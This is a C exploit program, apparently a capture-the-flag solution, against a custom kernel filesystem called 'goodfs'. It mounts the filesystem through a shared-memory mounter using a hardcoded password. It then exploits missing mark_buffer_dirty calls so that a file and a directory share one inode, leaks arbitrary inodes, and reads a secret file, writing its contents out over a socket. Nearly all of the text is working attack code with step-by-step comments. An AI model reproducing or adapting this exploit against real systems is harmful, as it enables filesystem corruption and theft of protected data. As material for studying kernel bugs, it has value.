#define SOCKFD 5
#define SOCK fdopen(SOCKFD)
#define printf(...) fprintf(SOCK, ##__VA_ARGS__)

/** syscall wrappers **/
void exit_group(int code) {
    __syscall(231, code);
}

void xmkdir(const char *path, int mode) {
    int res = mkdir(path, mode);
    if(res < 0) {
        printf("mkdir %s failed: %d\n", path, res);
        exit_group(1);
    }
}

int getdents64(int fd, void *dents, int size) {
    return __syscall(217, fd, dents, size);
}

void my_xutime(const char *path, unsigned long long atime, unsigned long long mtime) {
    unsigned long long timebuf[2];
    timebuf[0] = atime;
    timebuf[1] = mtime;
    int res = __syscall(132, path, timebuf);
    if(res < 0) {
        printf("utime %s failed: %d\n", path, res);
        exit_group(1);
    }
}

/** utilities **/
void pause(const char *msg) {
    printf("%s", msg);
    char buf[1];
    read(SOCKFD, buf, 1);
}

/** goodfs stuff **/
struct mounter_shmem {
    int flag;
    char password[256];
    char command[256];
    char arguments[256];
};

int mount_cmd(char *command, char *arguments) {
    int mfd = open("/run/mount_shm", 2, 0);
    void *maddr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
    struct mounter_shmem *m = (struct mounter_shmem *)maddr;
    strcpy(m->password, "MGhtT34gHj5yFcszRYB4gf45DtymEi");
    strcpy(m->command, command);
    strcpy(m->arguments, arguments);
    m->flag = 1;
    struct timespec sleeptime;
    sleeptime.tv_sec = 0;
    sleeptime.tv_nsec = 1000000;
    while(m->flag == 1)
      nanosleep(&sleeptime, NULL);
    int res = m->flag;
    munmap(maddr, 0x1000);
    close(mfd);
    return res;
}

void do_mount() {
    int res = mount_cmd("mount", "goodfs");
    if(res != 2) {
        printf("mount failed: %d\n", res);
        exit_group(1);
    }
}

void do_umount() {
    int res = mount_cmd("umount", "goodfs");
    if(res != 2) {
        printf("mount failed: %d\n", res);
        exit_group(1);
    }
}

/** ls replacement **/
struct linux_dirent64 {
    uint64_t ino;
    uint64_t off;
    short reclen;
    char type;
    char name[1];
};

void showstat(const char *path) {
    int fd = open(path, O_RDONLY, 0);
    if(fd < 0) {
        printf("[open err: %d]\n", fd);
        return;
    }
    struct stat stat;
    int res = fstat(fd, &stat);
    if(res < 0) {
        printf("[stat err: %d]\n", res);
        close(fd);
        return;
    }
    printf("devino=%d:%d mode=0x%x nlink=%d uidgid=%d:%d size=%d\n",
        stat.st_dev, stat.st_ino, stat.st_mode, stat.st_nlink,
        stat.st_uid, stat.st_gid, stat.st_size);
    close(fd);
}

void lsdir(const char *path) {
    char newpath[4096];
    char dents[32768];
    int dfd = open(path, O_DIRECTORY | O_RDONLY, 0);
    while(1) {
        int nbytes = getdents64(dfd, dents, 32768);
        if(nbytes <= 0)
            break;
        int ptr = 0;
        while(ptr < nbytes) {
            struct linux_dirent64 *s = (struct linux_dirent64 *)&dents[ptr];
            printf("ino=%d off=%d type=%d name=%s ", s->ino, s->off, s->type, s->name);
            sprintf(newpath, "%s/%s", path, s->name);
            showstat(newpath);
            ptr += s->reclen;
        }
    }
    close(dfd);
}

struct goodfs_dir_entry {
    int ino;
    char name[32];
};

int main() {
    do_mount();

    /* Allocate enough inodes to spill the new inodes into the second superblock block */
    xmkdir("/mnt/goodfs/public/d0", 0777);
    xmkdir("/mnt/goodfs/public/d1", 0777);
    xmkdir("/mnt/goodfs/public/d2", 0777);
    xmkdir("/mnt/goodfs/public/d3", 0777);
    xmkdir("/mnt/goodfs/public/d4", 0777);
    xmkdir("/mnt/goodfs/public/d5", 0777);
    xmkdir("/mnt/goodfs/public/d6", 0777);
    xmkdir("/mnt/goodfs/public/d7", 0777);
    for(int i=0; i<120; i++) {
        char path[256];
        sprintf(path, "/mnt/goodfs/public/d%d/f%d", i / 16, i % 16);
        int fd = open(path, O_CREAT | O_RDWR, 0666);
        if(fd < 0) {
            printf("failed to create %s: %d\n", path, fd);
        }
        close(fd);
    }
    xmkdir("/mnt/goodfs/public/crimes", 0777);
    /* prevent create from propagating mtime change to root inodes */
    my_xutime("/mnt/goodfs/public/crimes", 0x7fffffff, 0x7fffffff);
    do_umount();

    do_mount();
    /* When creating this inode, the free bitmap update (on the first superblock block)
       will not be committed because of a missing mark_buffer_dirty.
       The inode itself is created on the second superblock block. */
    int fd = open("/mnt/goodfs/public/crimes/aaa", O_CREAT | O_RDWR, 0777);
    struct goodfs_dir_entry entries[16];
    for(int i=0; i<16; i++) {
        entries[i].ino = i;
        sprintf(entries[i].name, "i%d", i);
    }
    write(fd, entries, sizeof(entries));
    close(fd);
    lsdir("/mnt/goodfs/public/crimes");
    do_umount();

    do_mount();
    /* This directory inode will reuse the "aaa" inode. Due to another missing
       mark_buffer_dirty, the zeroing of the data block will not be committed. */
    xmkdir("/mnt/goodfs/public/crimes/bbb", 0777);
    do_umount();

    do_mount();
    /* aaa and bbb now reference the same inode, and bbb's directory contents
       are what was written to the aaa file initially - we can leak any inode */
    lsdir("/mnt/goodfs/public/crimes");
    lsdir("/mnt/goodfs/public/crimes/bbb");
    /* read some spicy secrets? */
    do_mount();
    char buf[4096];
    int secretfd = open("/mnt/goodfs/public/crimes/bbb/i3", O_RDONLY, 0);
    if(secretfd >= 0) {
        read(secretfd, buf, 4096);
        write(SOCKFD, buf, 4096);
        close(secretfd);
    } else {
        printf("failed to open i3: %d\n", secretfd);
    }
    do_umount();

    exit_group(0);
}
